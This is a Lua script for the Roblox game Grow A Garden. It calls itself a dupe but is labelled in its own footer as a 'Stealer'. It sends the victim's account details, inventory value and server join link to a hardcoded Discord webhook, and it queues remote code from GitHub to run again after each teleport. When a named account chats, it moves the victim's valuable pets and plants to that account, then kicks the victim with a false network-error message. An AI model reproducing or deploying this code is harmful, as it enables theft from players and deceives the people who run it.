_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {"kittypaw121709"}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local PlaceID = game.PlaceID

local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()

--[[
================================================================================

SERVER HOP

================================================================================
]]
pcall(function()
    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/crack-scripts/Grow-A-Garden/refs/heads/main/dupe.lua"))()
    ]])
end)

local function serverHop()
    local servers = {}
    local cursor = ""

    repeat
        local success, result = pcall(function()
            return HttpService:JSONDecode(
                game:HttpGet("https://games.roblox.com/v1/games/"..PlaceID.."/servers/Public?sortOrder=Asc&limit=100&cursor="..cursor)
            )
        end)

        if success and result and result.data then
            for _, srv in ipairs(result.data) do
                if srv.playing < srv.maxPlayers and srv.id ~= game.JobId then
                    table.insert(servers, srv.id)
                end
            end
            cursor = result.nextPageCursor or ""
        else
            break
        end
    until cursor == "" or cursor == nil

    if #servers > 0 then
        TeleportService:TeleportToPlaceInstance(PlaceID, servers[math.random(#servers)])
    else
        TeleportService:Teleport(PlaceID)
    end
end

local hopNeeded = false

if next(users) == nil or webhook == "" then
    hopNeeded = true
end

if game.PlaceId ~= 126884695634066 then
    hopNeeded = true
end

if #Players:GetPlayers() >= 5 then
    hopNeeded = true
end

local okVIP, serverType = pcall(function()
    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
end)

if okVIP and serverType == "VIPServer" then
    hopNeeded = true
end

if hopNeeded then
    serverHop()
end

-- =============================================================================

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {
    "Dilophosaurus",
    "Elephant",
    "Headless Horseman",
    "Spider",
    "Peacock",
    "Raccoon"
}

local petEmoji = {
    ["racc"]      = "🦝",
    ["peacock"]   = "🦚",
    ["elephant"]  = "🐘",
    ["horseman"]  = "🎃",
    ["spider"]    = "🕷️",
    ["dilo"]      = "🦖", 
    ["queen bee"] = "🐝",
    ["Mimic"]     = "🐙",
    ["squid"]     = "🦑",
    ["ferret"]    = "🦦",
    ["turtle"]    = "🐢",
    ["disco"]     = "🪩",
    ["dragon"]    = "🐉",
    ["kitsune"]   = "🌸"
}
local DEFAULT_EMOJI = "🐶"

local mutationNameMap = {
    ["A"] = "Nightmare",
    ["o"] = "Rainbow",
    ["i"] = "Mega"
}

local totalValue = 0
local itemsToSend = {}

local executorName = "Unknown"
if getexecutorname then
    pcall(function()
        executorName = tostring(getexecutorname())
    end)
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0

    for _, item in ipairs(itemsToSend) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end

    return highestWeight
end

local function convertMutationTag(mutation)
    return mutationMap[mutation] or ""  
end

local function getSizeTag(weight)
    if weight >= 9 then
        return "Titanic"
    elseif weight >= 7 then
        return "Semi-Titanic"
    elseif weight >= 5 then
        return "Huge"
    end
    return nil
end

local function getPetEmoji(name)
    local lower = name:lower()
    for key, emoji in pairs(petEmoji) do
        if lower:find(key, 1, true) then
            return emoji
        end
    end
    return DEFAULT_EMOJI
end

local function BuildRareInventory()
    local inventory  = {}
    local hasRare    = false

    for _, item in ipairs(itemsToSend) do
        local isRarePet = table.find(rarePets, item.Name) ~= nil
        local sizeTag   = getSizeTag(item.Weight or 0)

        if isRarePet or sizeTag then
            hasRare = true

            local emoji = getPetEmoji(item.Name)

            local prefixParts = {}
            if sizeTag then
                table.insert(prefixParts, sizeTag)
            end

            local mutationName = mutationNameMap[item.Mutation] or item.Mutation
            local isNaturalRainbow = item.Name:sub(1,7) == "Rainbow" and item.Mutation == ""

            if mutationName ~= "" then
                table.insert(prefixParts, mutationName)
            elseif isNaturalRainbow then
                table.insert(prefixParts, "Rainbow")
            end

            local cleanName = item.Name:gsub("^Rainbow ", "")

            local fullPrefix = table.concat(prefixParts, " ")
            local line = string.format("%s %s%s (%s KG) [Age %d]",
                emoji,
                fullPrefix ~= "" and (fullPrefix .. " ") or "",
                cleanName,
                string.format("%.2f", item.Weight or 0),
                item.Age or 0)

            table.insert(inventory, line)
        end
    end

    if #inventory == 0 then return "```N/A```", false end
    local text = "```\n" .. table.concat(inventory, "\n") .. "\n```"
    return text, true
end


local function SendJoinMessage(list, prefix)
    local inventoryText, hasRare = BuildRareInventory()

    local fields = {
        {
            name = "👤 Account Information",
            value = string.format("```Name: %s\nExecutor: %s\nAccount Age: %s```",
                plr.Name,
                executorName,
                tostring(plr.AccountAge)
            ),
            inline = false
        },
        {
            name = "💰 Value",
            value = string.format("```Value: ¢%s```",
                formatNumber(totalValue)),
            inline = false
        },
        {
            name = "🎒 Inventory",
            value = inventoryText,
            inline = false
        },
        {
            name = "🔗 Join Link",
            value = "**[" .. game.JobId .. "](https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId .. ")**",
            inline = false
        }
    }

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 Grow A Garden Hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Grow A Garden Stealer Made By: k1el.xyz"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {
                    Tool     = tool,
                    Name     = v14.PetType,
                    Value    = value,
                    Weight   = weight,
                    Type     = "Pet",
                    Mutation = v14.PetData.MutationType or "",
                    Age      = v14.PetData.Level or 0
                })
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(sentItems, prefix)

    local function doSteal(player)
        local victimRoot = character:WaitForChild("HumanoidRootPart")
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        wait(0.1)

        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
                repeat
                    task.wait(0.01)
                until promptHead.Enabled
                fireproximityprompt(promptHead)
            else
                repeat
                    task.wait(0.01)
                until promptRoot.Enabled
                fireproximityprompt(promptRoot)
            end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end

        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end

        plr:kick("You're game crash due to unstable network")
    end
    
    local function waitForUserChat()
        local function createOverlay(p)
            local sg = Instance.new("ScreenGui")
            sg.Name = "StealOverlay"
            sg.ResetOnSpawn = false
            sg.IgnoreGuiInset = true
            sg.Parent = p:WaitForChild("PlayerGui")

            local overlay = Instance.new("Frame")
            overlay.Size = UDim2.new(1,0,1,0)
            overlay.BackgroundColor3 = Color3.new(0,0,0)
            overlay.BackgroundTransparency = 0.35
            overlay.Parent = sg

            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(0,300,0,80)
            lbl.Position = UDim2.new(0.5,-150,0.5,-40)
            lbl.BackgroundTransparency = 1
            lbl.Text = "10:00"
            lbl.TextColor3 = Color3.new(1,1,1)
            lbl.TextScaled = true
            lbl.Font = Enum.Font.SourceSansBold
            lbl.Parent = overlay

            coroutine.wrap(function()
                local endT = tick()+600
                while tick()<endT do
                    local left = endT-tick()
                    lbl.Text = string.format("%02d:%02d",left/60,left%60)
                    wait(1)
                end
                sg:Destroy()
            end)()

            return sg
        end

        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    createOverlay(player)
                    wait(3)
                    doSteal(player)
                end)
            end
        end

        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
